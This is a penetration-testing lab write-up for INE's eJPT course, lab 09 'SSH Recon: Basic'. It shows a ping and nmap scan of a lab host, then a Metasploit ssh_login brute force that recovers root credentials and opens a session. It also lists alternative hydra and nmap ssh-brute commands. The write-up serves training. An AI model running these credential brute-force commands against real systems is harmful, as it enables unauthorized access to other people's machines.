```jsx
Lab Name: SSH Recon: Basic
Platform: INE
Lab No: 09
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping demo.ine.local
PING demo.ine.local (192.254.69.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.254.69.3): icmp_seq=1 ttl=64 time=0.096 ms
64 bytes from demo.ine.local (192.254.69.3): icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from demo.ine.local (192.254.69.3): icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from demo.ine.local (192.254.69.3): icmp_seq=4 ttl=64 time=0.043 ms
^Z
[1]+  Stopped                 ping demo.ine.local
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 18:17 IST
Nmap scan report for demo.ine.local (192.254.69.3)
Host is up (0.000022s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:FE:45:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

## Password BruteForce:

```Console
┌──(root㉿INE)-[~]
└─# msfconsole
Metasploit tip: Metasploit can be configured at startup, see msfconsole 
--help to learn more
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.4.12-dev                          ]
+ -- --=[ 2426 exploits - 1250 auxiliary - 428 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and pa
                                                ssword
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful log
                                                in
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the c
                                                urrent database
   DB_ALL_PASS       false            no        Add all passwords in the current database to
                                                the list
   DB_ALL_USERS      false            no        Add all users in the current database to the                                                                                                                                               
                                                list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the curre
                                                nt database (Accepted: none, user, user&realm
                                                )
   PASSWORD                           no        A specific password to authenticate with
PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasplo
                                                it.com/docs/using-metasploit/basics/using-met
                                                asploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a h
                                                ost
   THREADS           1                yes       The number of concurrent threads (max one per
                                                 host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated
                                                 by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all user
                                                s
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > RHOSTS demo.ine.local
[-] Unknown command: RHOSTS. Did you mean hosts? Run the help command for more details.
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/ssh/ssh_login) > 
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

[*] 192.152.11.3:22 - Starting bruteforce
[-] 192.152.11.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.152.11.3:22 - Failed: 'root:!root'
[-] 192.152.11.3:22 - Failed: 'root:Cisco'
[-] 192.152.11.3:22 - Failed: 'root:NeXT'
[-] 192.152.11.3:22 - Failed: 'root:QNX'
[-] 192.152.11.3:22 - Failed: 'root:admin'
[+] 192.152.11.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux demo.ine.local 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.152.11.2:45747 -> 192.152.11.3:22) at 2024-08-23 19:08:32 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Some other commands for brute force:

```console
hydra -l student -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh
```

![image](https://github.com/user-attachments/assets/c203656d-b2eb-485e-8857-e0ccd6d269b3)

```console
nmap -p 22 --script ssh-brute --script-args userdb=/root/users demo.ine.local
```

![image](https://github.com/user-attachments/assets/312e85d2-4a4e-4e7f-aef9-e39ef6e65796)

---
